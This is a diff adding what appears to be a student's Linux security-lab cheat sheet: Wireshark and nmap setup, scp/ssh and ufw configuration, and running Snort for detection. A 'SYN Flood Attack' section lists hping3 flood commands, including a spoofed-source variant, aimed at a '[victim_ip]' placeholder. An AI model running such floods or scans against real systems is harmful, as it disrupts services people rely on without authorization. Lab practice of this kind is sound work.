@@ -1,0 +1,64 @@
+Wireshark:
+---------------
+sudo apt install wireshark
+
+sudo wireshark
+
+
+NMap
+-------
+sudo apt-get install nmap
+nmap [victim_ip]
+
+SYN Flood Attack:
+-----------------
+sudo apt install hping3
+
+hping3 -1 --flood [victim_ip]
+hping3 -1 --rand-source -c 1 [victim_ip]
+hping3 -S --flood -p [target_port] [victim_ip]
+
+CPU visualization:
+---------------------
+sudo apt-get install nmon
+sudo nmon
+
+
+Copying from One Linux to Another Linux:
+-------------------------------------------
+[Reciever Pc]
+sudo apt install ssh
+sudo systemctl status ssh
+sudo systemctl start ssh
+
+[Now source pc]:
+scp ca.crt client@192.168.0.7:/home/ubuntu-client/Documents/
+
+
+openssh:
+--------------
+install on both pc.
+sudo apt install openssh-server
+
+now from client pc type:
+ssh server@192.168.0.7  [[for default port 22]]
+
+*if i change the port 22 to 3000 on server pc: sudo nano /etc/ssh/sshd_config  then
+i have to write the following command on server pc to access the server from client pc: 
+sudo ufw allow from 192.168.0.7 to any port 3000 proto tcp  **
+
+
+-sudo ufw deny ssh
+-sudo ufw allow ssh
+sudo ufw allow 192.168.0.5 to any port 22
+
+
+
+Snort attack detection:
+---------------------------
+
+[[[sudo kill -9 1193]]]
+
+
+sudo snort -A console -q -u snort -g snort -c /etc/snort/snort.conf -i enp0s3
+
